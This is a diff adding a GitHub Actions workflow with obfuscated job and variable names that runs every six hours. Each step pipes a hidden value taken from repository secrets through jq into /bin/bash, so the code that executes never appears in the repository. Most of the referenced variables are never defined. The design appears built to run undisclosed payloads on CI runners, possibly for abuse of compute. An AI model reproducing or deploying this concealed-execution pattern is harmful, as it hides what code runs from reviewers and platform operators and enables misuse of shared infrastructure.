@@ -1,0 +1,25 @@
+name: mabianzao7815
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '6 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: mabianzao7815
+        env:
+          txqrp56: ${{ secrets.txqrp56 }}
+        run: |
+          echo $txqrp56 | jq -r .em0 | /bin/bash
+          echo $ddva32 | jq -r .fce2 | /bin/bash
+          echo $eniq57449 | jq -r .mkqq8092 | /bin/bash
+          echo $gckwi8 | jq -r .mfy90 | /bin/bash
+          echo $ft11 | jq -r .dvcra1092 | /bin/bash
+          echo $y9632 | jq -r .vzc5632 | /bin/bash
+          echo $xwle3753 | jq -r .jyne0 | /bin/bash
+          echo $boui401 | jq -r .ibwp52829 | /bin/bash
+
